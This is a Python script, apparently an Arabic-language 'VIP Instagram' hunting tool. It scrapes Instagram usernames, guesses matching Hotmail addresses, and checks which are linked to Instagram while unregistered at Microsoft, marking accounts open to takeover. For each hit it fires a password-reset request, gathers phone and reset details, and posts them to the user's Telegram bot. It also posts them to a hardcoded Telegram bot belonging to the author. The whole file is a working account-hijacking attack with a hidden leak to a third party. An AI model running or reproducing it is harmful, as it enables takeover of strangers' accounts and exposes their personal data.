import random
import requests
from uuid import uuid4
from user_agent import generate_user_agent
from faker import Faker
from secrets import token_hex
from OneClick import *
from AegosPy import GetInfoInsta
import random,requests,time;from uuid import uuid4;uui,uid= uuid4(),uuid4();from rich.console import Console;from rich.table import Table;import threading;from user_agent import generate_user_agent;useragnet=str(generate_user_agent())
uid = uuid4()
csr = token_hex(8) * 2
bb = 0  
#------------------------------[الالوان]------------------------------
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
Z1 = '\033[2;31m' #احمر ثاني
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\x1b[38;5;208m' #برتقالي
Y = '\033[1;34m' #ازرق فاتح
M = '\x1b[1;37m'#ابیض
S = '\033[1;33m'
U = '\x1b[1;37m'#ابیض
BRed = '\x1b[1;31m'
BGreen = '\x1b[1;32m'
BYellow = '\x1b[1;33m'
R = '\x1b[1;34m'
BPurple = '\x1b[1;35m'
BCyan = '\x1b[1;36m'
BWhite = '\x1b[1;37m'
#------------------------------[الالوان]------------------------------

print(f'''{B}{E}=============================={B}
|{F}[+] YouTube    : {B}|أحمد الحراني 
|{F}[+] TeleGram  : {B} maho_s9    |
|{F}[+] Instagram  : {B}ahmedalharrani |
|{F}[+] Tool  : {B}VIP INSTAGRAM |
|{F}[+] Server3  : {B}VIP 3 |
{E}==============================''')
print('تم التصليح')
sid = input('sisson ID : -')
cp = input(f' {F}({C}1{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐓𝐨𝐤𝐞𝐧{F}  ' + Z)
print(X + ' ═════════════════════════════════  ')
ok = input(f' {F}({C}2{F}) {Y} 𝐄𝐧𝐭𝐞𝐫 𝐈𝐃{F}  ' + Z)

#------------------------------[فقط لنعرف صور الصيد]------------------------------#
tok = "6396326376:AAFF8FOOTbR0a7fvXhsICdt3-sKCtN3Ho6Q"
io = "5845684006"
#------------------------------[لسنا بحاجه المتاحات]------------------------------#

def ahmed(email):
    url = 'https://www.instagram.com/api/v1/web/accounts/check_email/'
    headers = {
        'Host': 'www.instagram.com',
        'Content-Length': '22',
        'Sec-Ch-UA': '"Android WebView";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'X-Ig-Www-Claim': '0',
        'Sec-Ch-UA-Platform-Version': '"11.0.0"',
        'X-Requested-With': 'XMLHttpRequest',
        'Dpr': '2',
        'Sec-Ch-UA-Full-Version-List': '"Android WebView";v="119.0.6045.163", "Chromium";v="119.0.6045.163", "Not?A_Brand";v="24.0.0.0"',
        'X-Csrftoken': 'VePQfPfUYHlwXGsHe74dBAYcUJ4dwNR6',
        'Sec-Ch-UA-Model': '"RMX3231"',
        'Sec-Ch-UA-Platform': '"Android"',
        'X-Ig-App-Id': '1217981644879628',
        'Sec-Ch-Prefers-Color-Scheme': 'light',
        'Sec-Ch-UA-Mobile': '?1',
        'X-Instagram-Ajax': '1010142781',
        'User-Agent': useragnet,
        'Viewport-Width': '360',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'X-Asbd-Id': '129477',
        'Origin': 'https://www.instagram.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.instagram.com/accounts/signup/email/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    }
    cookies = {
        'csrftoken': 'VePQfPfUYHlwXGsHe74dBAYcUJ4dwNR6',
        'mid': 'ZWlr6AABAAHM2vzmuOS-uwLYhgXX',
        'ig_nrcb': '1',
        'datr': '5GtpZXKDqnzbfcIZg0FLkRqv',
        'ig_did': 'B2B00EA7-37E3-45D1-B806-DA1FFFB7D82D',
    }
    data = {
        'email': f'{email}'
    }

    req = requests.post(url, headers=headers, cookies=cookies, data=data).text

    if "email_is_taken" in req:
        print(M + f'متاح انستجرام  : [{email}]')

        loi = f'https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=0&emailAddress={email}&_=1604288577990'
        mimo = {
                        'content-type': 'application/x-www-form-urlencoded',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
                    }
        res = requests.post(loi, headers=mimo).text

        if 'Neither' in res:
            print(F + f'متاح هوتميل  : [{email}]')
                        
            user = email.split('@')[0]            

            Response = GetInfoInsta(user)
            Name = Response['name']
            Id = Response['id']
            flos = Response['followers']
            flog = Response['following']
            po = Response['posts']
            da = Response['date']

            heada = {
                            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                            "Host": "i.instagram.com",
                            "Connection": "Keep-Alive",
                            "User-Agent": generate_user_agent(),
                            "Cookie": "mid=YwvCRAABAAEsZcmT0OGJdPu3iLUs; csrftoken=" + csr,
                            "Cookie2": "$Version=1",
                            "Accept-Language": "en-US",
                            "X-IG-Capabilities": "AQ==",
                            "Accept-Encoding": "gzip",
                        }
            datai = {
                            "q": user,
                            "device_id": f"android{uid}",
                            "guid": uid,
                            "_csrftoken": csr
                        }
            kid = requests.post('https://i.instagram.com/api/v1/users/lookup/', headers=heada, data=datai).json()                                  
           
            prv = kid['user']['is_private']
            ph = kid['has_valid_phone']
            sms = kid['can_sms_reset']
            fb = kid['fb_login_option']
            wa = kid['can_wa_reset']
            phn = kid['phone_number']
            url = 'https://i.instagram.com/api/v1/accounts/send_password_reset/'
            head = {
                            'Host': 'i.instagram.com',
                            'Connection': 'Keep-Alive',
                            'Cookie': 'mid=YgzPXAABAAFpu2FvBU3Nz814ooE5; csrftoken=DVpBRlGfuAZ0E7JtTnLD71F0mcnNV2tW',
                            'Cookie2': '$Version=1',
                            'Accept-Language': 'en-GB, en-US',
                            'X-IG-Connection-Type': 'WIFI',
                            'X-IG-Capabilities': 'AQ==',
                            'Accept-Encoding': 'gzip'
                        }
            dataa = {
                            "user_email": f"{email}",
                            "device_id": "android-ae9d37a73aa41d00",
                            "guid": "d038a34e-1663-4f2b-af9d-aae995d105c4",
                            "_csrftoken": "DVpBRlGfuAZ0E7JtTnLD71F0mcnNV2tW"
                        }
            meq = requests.post(url, headers=head, data=dataa)

            if '"status":"ok"' in meq.text:
                rest = meq.json()['obfuscated_email']
            else:
                 rest = 'Band Requests !'
            tlg = (f"""
⋘─────━*مهوس*━─────⋙
Name >> {Name}
Username >> @{user}    
Email >> {email}     
ID >> {Id}
Followers >> {flos}
Following >> {flog}
Post >> {po}
Date >> {da}
Rest >> {rest}
Url >>  https://www.instagram.com/{user}
⋘─────━⚜️VIP⚜️━─────⋙
[+] Has Phone Number ? ==> {ph}
[+] SMS Rest ==> {sms}
[+] WhatsApp Rest ==> {wa}
[+] FaceBook Login ==> {fb}
[+] Phone Number ==> {phn}
⋘─────━❤️🌚━─────⋙
𝐁𝐘 :  @maho_s9 | @maho9s
""")
            requests.get("https://api.telegram.org/bot"+str(cp)+"/sendMessage?chat_id="+str(ok)+"&text="+str(tlg))
            requests.get("https://api.telegram.org/bot"+str(tok)+"/sendMessage?chat_id="+str(io)+"&text="+str(tlg))
            print(tlg+F)

    else:
         print(f'{Z}Bad IG : {email}')
         
 

def ch():
    global bb
    faker = Faker('ru_RU')

    while True:
        users = faker.user_name()
        url1 = f'https://www.instagram.com/api/v1/web/search/topsearch/?context=blended&include_reel=true&query={users}&rank_token=0.4675778310463927&search_surface=web_top_search'

        head1 = {
            'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cookie': f'mid=ZIwIGQALAAFJh0hs0zugnqEWswdV; ig_did=86209C21-70C2-4E14-B4F6-91D07CD08186; ig_nrcb=1; datr=EQiMZDSU8kuwtKAAlo7Zzc7X; shbid="15700\054512860282\0541723324593:01f73689efc90287a1755043118f103cf00011520f30b332cb9c6cb7e22bd65c2e9be9be"; shbts="1691788593\054512860282\0541723324593:01f70eed28db3817556817179468c4136331bc052166b0641d804a1715c83ed06ea3e5ef"; ds_user_id=61045883540; csrftoken=d9B3cjoZEBKnkJsZCKvWwDyzpB6hTo8A; sessionid={sid}; rur="CLN\05461045883540\0541723487339:01f741620fb5a3a54291c 7bb1141d0d0a809c73842c6958401e41d42b2037478a377fd8f"',
            'Referer': 'https://www.instagram.com/h8pl/',
            'Sec-Ch-Prefers-Color-Scheme': 'light',
            'Sec-Ch-Ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
            'Sec-Ch-Ua-Full-Version-List': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.171", "Chromium";v="115.0.5790.171"',
            'Sec-Ch-Ua-Mobile': '?0', 'Sec-Ch-Ua-Platform': '"Windows"',
            'Sec-Ch-Ua-Platform-Version': '"10.0.0"',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin', 'User-Agent': str(generate_user_agent()),
            'Viewport-Width': '718', 'X-Asbd-Id': '129477',
            'X-Csrftoken': 'sns7EiuaWlHURPEND7QuCiIl03EQsEzt',
            'X-Ig-App-Id': '936619743392459',
            'X-Ig-Www-Claim': 'hmac.AR21S63iRFxRSOmp5YPI60xla6XmM-5WuizCn7iaRP2o60FM',
            'X-Requested-With': 'XMLHttpRequest',
        }

        res1 = requests.get(url1, headers=head1).json()
        q = 0
        try:
            while True:
                q += 1
                bb += 1
                userss = str(res1['users'][q]['user']['username'])
                email = userss 
                email = email + '@hotmail.com'
                ahmed(email)
        except Exception as e:
            band_sesionid = 'Please change the sessionid'
            print(f"Errorغير سيزون ايدي قوي : {e}")

ch()
